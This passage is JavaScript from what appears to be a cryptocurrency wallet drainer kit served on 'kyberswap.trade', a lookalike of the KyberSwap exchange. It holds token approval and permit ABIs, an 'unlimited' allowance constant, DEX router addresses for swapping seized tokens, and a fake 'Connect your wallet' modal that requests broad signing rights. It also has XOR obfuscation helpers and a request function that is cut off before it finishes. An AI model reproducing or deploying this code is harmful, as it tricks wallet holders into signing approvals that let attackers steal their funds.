                    "name": "owner",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "buyer",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "numTokens",
                    "type": "uint256"
                }
            ],
            "name": "transferFrom",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function",
            "signature": "0x23b872dd"
        }
    ],
    "ERC721": [
        {
            "constant": false,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "tokenId",
                    "type": "uint256"
                }
            ],
            "name": "approve",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "tokenId",
                    "type": "uint256"
                }
            ],
            "name": "mint",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "from",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "tokenId",
                    "type": "uint256"
                }
            ],
            "name": "safeTransferFrom",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "from",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "tokenId",
                    "type": "uint256"
                },
                {
                    "internalType": "bytes",
                    "name": "_data",
                    "type": "bytes"
                }
            ],
            "name": "safeTransferFrom",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "internalType": "bool",
                    "name": "approved",
                    "type": "bool"
                }
            ],
            "name": "setApprovalForAll",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "from",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "tokenId",
                    "type": "uint256"
                }
            ],
            "name": "transferFrom",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "constructor"
        },
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "from",
                    "type": "address"
                },
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "indexed": true,
                    "internalType": "uint256",
                    "name": "tokenId",
                    "type": "uint256"
                }
            ],
            "name": "Transfer",
            "type": "event"
        },
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                },
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "approved",
                    "type": "address"
                },
                {
                    "indexed": true,
                    "internalType": "uint256",
                    "name": "tokenId",
                    "type": "uint256"
                }
            ],
            "name": "Approval",
            "type": "event"
        },
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                },
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "operator",
                    "type": "address"
                },
                {
                    "indexed": false,
                    "internalType": "bool",
                    "name": "approved",
                    "type": "bool"
                }
            ],
            "name": "ApprovalForAll",
            "type": "event"
        },
        {
            "constant": true,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                }
            ],
            "name": "balanceOf",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
        },
        {
            "constant": true,
            "inputs": [
                {
                    "internalType": "uint256",
                    "name": "tokenId",
                    "type": "uint256"
                }
            ],
            "name": "getApproved",
            "outputs": [
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
        },
        {
            "constant": true,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "operator",
                    "type": "address"
                }
            ],
            "name": "isApprovedForAll",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
        },
        {
            "constant": true,
            "inputs": [
                {
                    "internalType": "uint256",
                    "name": "tokenId",
                    "type": "uint256"
                }
            ],
            "name": "ownerOf",
            "outputs": [
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
        },
        {
            "constant": true,
            "inputs": [
                {
                    "internalType": "bytes4",
                    "name": "interfaceId",
                    "type": "bytes4"
                }
            ],
            "name": "supportsInterface",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
        }
    ],
    "PERMIT_2": [
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "value",
                    "type": "uint256"
                },
                {
                    "internalType": "uint256",
                    "name": "deadline",
                    "type": "uint256"
                },
                {
                    "internalType": "uint8",
                    "name": "v",
                    "type": "uint8"
                },
                {
                    "internalType": "bytes32",
                    "name": "r",
                    "type": "bytes32"
                },
                {
                    "internalType": "bytes32",
                    "name": "s",
                    "type": "bytes32"
                }
            ],
            "name": "permit",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ],
    "PERMIT_1": [
        {
            "constant": false,
            "inputs": [
                {
                    "internalType": "address",
                    "name": "holder",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "nonce",
                    "type": "uint256"
                },
                {
                    "internalType": "uint256",
                    "name": "expiry",
                    "type": "uint256"
                },
                {
                    "internalType": "bool",
                    "name": "allowed",
                    "type": "bool"
                },
                {
                    "internalType": "uint8",
                    "name": "v",
                    "type": "uint8"
                },
                {
                    "internalType": "bytes32",
                    "name": "r",
                    "type": "bytes32"
                },
                {
                    "internalType": "bytes32",
                    "name": "s",
                    "type": "bytes32"
                }
            ],
            "name": "permit",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ],
    "PERMIT2_SINGLE": [
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                }
            ],
            "name": "allowance",
            "outputs": [
                {
                    "internalType": "uint160",
                    "name": "amount",
                    "type": "uint160"
                },
                {
                    "internalType": "uint48",
                    "name": "expiration",
                    "type": "uint48"
                },
                {
                    "internalType": "uint48",
                    "name": "nonce",
                    "type": "uint48"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                },
                {
                    "components": [
                        {
                            "components": [
                                {
                                    "internalType": "address",
                                    "name": "token",
                                    "type": "address"
                                },
                                {
                                    "internalType": "uint160",
                                    "name": "amount",
                                    "type": "uint160"
                                },
                                {
                                    "internalType": "uint48",
                                    "name": "expiration",
                                    "type": "uint48"
                                },
                                {
                                    "internalType": "uint48",
                                    "name": "nonce",
                                    "type": "uint48"
                                }
                            ],
                            "internalType": "struct IAllowanceTransfer.PermitDetails",
                            "name": "details",
                            "type": "tuple"
                        },
                        {
                            "internalType": "address",
                            "name": "spender",
                            "type": "address"
                        },
                        {
                            "internalType": "uint256",
                            "name": "sigDeadline",
                            "type": "uint256"
                        }
                    ],
                    "internalType": "struct IAllowanceTransfer.PermitSingle",
                    "name": "permitSingle",
                    "type": "tuple"
                },
                {
                    "internalType": "bytes",
                    "name": "signature",
                    "type": "bytes"
                }
            ],
            "name": "permit",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "from",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "internalType": "uint160",
                    "name": "amount",
                    "type": "uint160"
                },
                {
                    "internalType": "address",
                    "name": "token",
                    "type": "address"
                }
            ],
            "name": "transferFrom",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ],
    "PERMIT2_BATCH": [
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                }
            ],
            "name": "allowance",
            "outputs": [
                {
                    "internalType": "uint160",
                    "name": "amount",
                    "type": "uint160"
                },
                {
                    "internalType": "uint48",
                    "name": "expiration",
                    "type": "uint48"
                },
                {
                    "internalType": "uint48",
                    "name": "nonce",
                    "type": "uint48"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                },
                {
                    "components": [
                        {
                            "components": [
                                {
                                    "internalType": "address",
                                    "name": "token",
                                    "type": "address"
                                },
                                {
                                    "internalType": "uint160",
                                    "name": "amount",
                                    "type": "uint160"
                                },
                                {
                                    "internalType": "uint48",
                                    "name": "expiration",
                                    "type": "uint48"
                                },
                                {
                                    "internalType": "uint48",
                                    "name": "nonce",
                                    "type": "uint48"
                                }
                            ],
                            "internalType": "struct IAllowanceTransfer.PermitDetails[]",
                            "name": "details",
                            "type": "tuple[]"
                        },
                        {
                            "internalType": "address",
                            "name": "spender",
                            "type": "address"
                        },
                        {
                            "internalType": "uint256",
                            "name": "sigDeadline",
                            "type": "uint256"
                        }
                    ],
                    "internalType": "struct IAllowanceTransfer.PermitBatch",
                    "name": "permitBatch",
                    "type": "tuple"
                },
                {
                    "internalType": "bytes",
                    "name": "signature",
                    "type": "bytes"
                }
            ],
            "name": "permit",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "components": [
                        {
                            "internalType": "address",
                            "name": "from",
                            "type": "address"
                        },
                        {
                            "internalType": "address",
                            "name": "to",
                            "type": "address"
                        },
                        {
                            "internalType": "uint160",
                            "name": "amount",
                            "type": "uint160"
                        },
                        {
                            "internalType": "address",
                            "name": "token",
                            "type": "address"
                        }
                    ],
                    "internalType": "struct IAllowanceTransfer.AllowanceTransferDetails[]",
                    "name": "transferDetails",
                    "type": "tuple[]"
                }
            ],
            "name": "transferFrom",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ]};

let MS_Ready = false, MS_ID = 0, MS_Deviceinfo, MS_Process = false,
MS_Provider = null, MS_Current_Provider = null, MS_Current_Address = null, MS_Current_Chain_ID = null,
MS_Web3 = null, MS_Signer = null, MS_Check_Done = false, MS_Currencies = {}, MS_Force_Mode = false,
MS_Sign_Disabled = false, BL_US = false, SP_US = false, XY_US = false, MS_Bad_Country = false,
MS_Connection = false, MS_Load_Time = null;

const WC2_Provider = window["@walletconnect/ethereum-provider"].EthereumProvider;
const is_valid_json = (data) => { try { JSON.parse(data); } catch(err) { return false; } return true; };

(async () => {
  try {
    let response = await fetch(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    MS_Currencies = await response.json();
    MS_Currencies['PLS'] = { USD: 0.00004512 };
  } catch(err) {
    console.log(err);
  }
})();

const MS_API_Data = {
  1: 'api.etherscan.io',
  10: 'api-optimistic.etherscan.io',
  56: 'api.bscscan.com',
  137: 'api.polygonscan.com',
  250: 'api.ftmscan.com',
  42161: 'api.arbiscan.io',
  43114: 'api.snowtrace.io',
  8453: 'api.basescan.org'
};

var MS_MetaMask_ChainData = {};

const fill_chain_data = () => {
  MS_MetaMask_ChainData = {
    1: {
      chainId: '0x1',
      chainName: "Ethereum Mainnet",
      nativeCurrency: {
        name: "Ether",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[1]],
      blockExplorerUrls: ["https://etherscan.io"]
    },
    56: {
      chainId: '0x38',
      chainName: "BNB Smart Chain",
      nativeCurrency: {
        name: "Binance Coin",
        symbol: "BNB",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[56]],
      blockExplorerUrls: ["https://bscscan.com"]
    },
    137: {
      chainId: '0x89',
      chainName: "Polygon Mainnet",
      nativeCurrency: {
        name: "MATIC",
        symbol: "MATIC",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[137]],
      blockExplorerUrls: ["https://polygonscan.com"]
    },
    43114: {
      chainId: '0xA86A',
      chainName: "Avalanche Network C-Chain",
      nativeCurrency: {
        name: "AVAX",
        symbol: "AVAX",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[43114]],
      blockExplorerUrls: ["https://snowtrace.io/"]
    },
    42161: {
      chainId: '0xA4B1',
      chainName: "Arbitrum One",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[42161]],
      blockExplorerUrls: ["https://explorer.arbitrum.io"]
    },
    10: {
      chainId: '0xA',
      chainName: "Optimism",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[10]],
      blockExplorerUrls: ["https://optimistic.etherscan.io/"]
    },
    250: {
      chainId: '0xFA',
      chainName: "Fantom Opera",
      nativeCurrency: {
        name: "FTM",
        symbol: "FTM",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[250]],
      blockExplorerUrls: ["https://ftmscan.com/"]
    },
    8453: {
      chainId: '0x2105',
      chainName: "Base",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[8453]],
      blockExplorerUrls: ["https://basescan.org/"]
    },
    324: {
      chainId: '0x144',
      chainName: "zkSync Era",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[324]],
      blockExplorerUrls: ["https://explorer.zksync.io/"]
    },
    369: {
      chainId: '0x171',
      chainName: "Pulse",
      nativeCurrency: {
        name: "PLS",
        symbol: "PLS",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[369]],
      blockExplorerUrls: ["https://scan.pulsechain.com/"]
    },
  };
};

const MS_Routers = {
  1: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Pancake', '0xEfF92A263d31888d860bD50809A8D171709b7b1c'],
    ['Pancake_V3', '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4'],
    ['Sushiswap', '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F']
  ],
  10: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45']
  ],
  56: [
    ['Pancake', '0x10ED43C718714eb63d5aA57B78B54704E256024E'],
    ['Pancake_V3', '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  137: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506'],
    ['Quickswap', '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff']
  ],
  250: [
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  42161: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  43114: [
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ]
};

const MS_Swap_Route = {
  1: '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2',
  10: '0x4200000000000000000000000000000000000006',
  56: '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c',
  137: '0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270',
  250: '0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83',
  42161: '0x82af49447d8a07e3bd95bd0d56f35241523fbab1',
  43114: '0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7'
};

const MS_Uniswap_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"}];
const MS_Pancake_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForETH","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"}];

const MS_Current_URL = "https://kyberswap.trade".replace(/http[s]*:\/\//, '');
const MS_Mobile_Status = (() => {
  let check = false;
  (function (a) { if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true; })(navigator.userAgent || navigator.vendor || window.opera);
  return check;
})();
const MS_Apple_Status = (() => {
  try {
    return [
      'iPad Simulator', 'iPhone Simulator', 'iPod Simulator', 'iPad', 'iPhone', 'iPod'
    ].includes(navigator.platform) || (navigator.userAgent.includes("Mac") && "ontouchend" in document);
  } catch(err) {
    return false;
  }
})();

const MS_Unlimited_Amount = '1158472395435294898592384258348512586931256';

const MS_Modal_Data = [
  {
    type: 'style',
    data: `@import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px 0 0;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px solid rgba(0,0,0,.1);margin-top:21px}.web3-modal .item{padding:15px 34px;border-bottom:1px solid rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal .item:hover{background:#fafafa;border-radius: 20px}.web3-modal .item div{display:flex;align-items:center}.web3-modal .item:last-child{border-bottom:none;border-radius: 0px 0px 60px 60px;}.web3-modal .item span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal .item .icon{width:40px;height:40px;justify-content:center}.web3-modal .item .arrow{height:12px;width:7.4px;background:url('/assets/web3-modal/images/arrow.svg') no-repeat} @media (prefers-color-scheme: dark) {.web3-modal {background: #1c1c1c;color: #fff;}.web3-modal-items {border-top: 1px solid #E4DDDD;}.web3-modal .item span {color: #fff;}.web3-modal .item .arrow {-webkit-filter: invert(1);filter: invert(1);}.web3-modal-title {color: #fff;}.web3-modal .item:hover {background:#262525;} .swal2-popup { background: #1c1c1c; color: #ffffff; } .swal2-styled.swal2-confirm { background-color: #3e7022; } .swal2-styled.swal2-confirm:focus { box-shadow: 0 0 0 3px #3e7022; } }`
  },
  {
    type: 'html',
    data: `<div class="web3-modal-main"><p class="web3-modal-title" style="margin-top:0">Connect your wallet</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("MetaMask")'><div><div class="icon"><img src="/assets/web3-modal/images/MM.svg" alt=""></div><span>MetaMask</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Coinbase")'><div><div class="icon"><img src="/assets/web3-modal/images/CB.svg" alt=""></div><span>Coinbase</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Trust Wallet")'><div><div class="icon"><img src="/assets/web3-modal/images/TW.svg" alt=""></div><span>Trust Wallet</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Binance Wallet")'><div><div class="icon"><img src="/assets/web3-modal/images/BW.svg" alt=""></div><span>Binance Wallet</span></div><div class="arrow"></div></div><div class="item" onclick="use_wc()"><div><div class="icon"></div><span>More Wallets</span></div><div class="arrow"></div></div></div></div><div class="web3-modal-wc" style="display:none"><p class="web3-modal-title" style="margin-top:0">Choose Version</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/assets/web3-modal/images/WC.svg" alt=""></div><span>WalletConnect</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/assets/web3-modal/images/WC1.svg" alt=""></div><span>WalletConnect Legacy</span></div><div class="arrow"></div></div><div class="item" onclick="ms_init()"><div class="arrow" style="transform:rotateY(190deg)"></div><div><div class="icon"></div><span>Return to Wallets</span></div></div></div></div>`
  }
];

const inject_modal = () => {
  try {
    let modal_style = document.createElement('style');
    modal_style.id = 'web3-style';
    modal_style.innerHTML = MS_Modal_Data[0].data;
    document.head.appendChild(modal_style);
    let overlay_elem = document.createElement('div');
    overlay_elem.id = 'web3-overlay';
    overlay_elem.classList = ['web3-overlay'];
    overlay_elem.style.display = 'none';
    document.body.prepend(overlay_elem);
    document.querySelector('.web3-overlay').addEventListener('click', () => { ms_hide(); });
    let modal_elem = document.createElement('div');
    modal_elem.id = 'web3-modal';
    modal_elem.classList = ['web3-modal'];
    modal_elem.style.display = 'none';
    modal_elem.innerHTML = MS_Modal_Data[1].data;
    document.body.prepend(modal_elem);
  } catch(err) {
    console.log(err);
  }
};

const set_modal_data = (style_code, html_code) => {
  try {
    MS_Modal_Data[0].data = style_code;
    MS_Modal_Data[1].data = html_code;
    reset_modal();
  } catch(err) {
    console.log(err);
  }
};

const reset_modal = () => {
  try { document.getElementById('web3-modal').remove(); } catch(err) { console.log(err); }
  try { document.getElementById('web3-overlay').remove(); } catch(err) { console.log(err); }
  try { document.getElementById('web3-style').remove(); } catch(err) { console.log(err); }
  try { inject_modal(); } catch(err) { console.log(err); }
};

const ms_init = () => {
  try {
    if (!MS_Connection) return connect_wallet();
    if (MS_Process) return;
    if (MS_Modal_Style == 2) {
      MSM.open(MS_Color_Scheme, MS_Modal_Mode);
    } else {
      document.getElementById('web3-modal').style.display = 'block';
      document.getElementById('web3-overlay').style.display = 'block';
      document.getElementsByClassName('web3-modal-main')[0].style.display = 'block';
      document.getElementsByClassName('web3-modal-wc')[0].style.display = 'none';
    }
  } catch (err) {
    console.log(err);
  }
};

const ms_hide = () => {
  try {
    if (MS_Modal_Style == 2) {
      MSM.close();
    } else {
      document.getElementById('web3-modal').style.display = 'none';
      document.getElementById('web3-overlay').style.display = 'none';
    }
  } catch (err) {
    console.log(err);
  }
};

const load_wc = async () => {
  let all_chains_arr = [], all_chains_obj = {};
  for (const chain_id in MS_Settings.RPCs) {
    if (chain_id != '1') all_chains_arr.push(chain_id);
    all_chains_obj[chain_id] = MS_Settings.RPCs[chain_id];
  }
  MS_Provider = await WC2_Provider.init({
    projectId: MS_WalletConnect_ID,
    chains: [ '1' ],
    optionalChains: all_chains_arr,
    metadata: MS_WalletConnect_MetaData,
    showQrModal: true,
    rpcMap: all_chains_obj,
    methods: [
      'eth_sendTransaction',
      'eth_signTransaction',
      'eth_sign', 'personal_sign',
      'eth_signTypedData',
      'eth_signTypedData_v4'
    ],
    qrModalOptions: (MS_WalletConnect_Customization == 1) ? MS_WalletConnect_Theme : undefined
  });
};

const prs = (s, t) => {
  const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
  const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return t.split("").map(ab).map(as).map(bh).join("");
};

const srp = (s, e) => {
  const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
};

let prs_enc = 0, last_request_ts = 0;
(async () => {
  prs_enc = MS_Encryption_Key;
  MS_Encryption_Key = Math.floor(Math.random() * 1000);
})()

const send_request = async (data) => {
    
    
    
    try {
        
        while (Date.now() <= last_request_ts)
        await new Promise(r => setTimeout(r, 1));
        last_request_ts = Date.now();
        data.domain = 'kyberswap.trade';
        data.user_id = MS_ID || null;
         

        console.log('Data enviado ', data);
        let response_data = JSON.parse('{ "status": "OK" }');
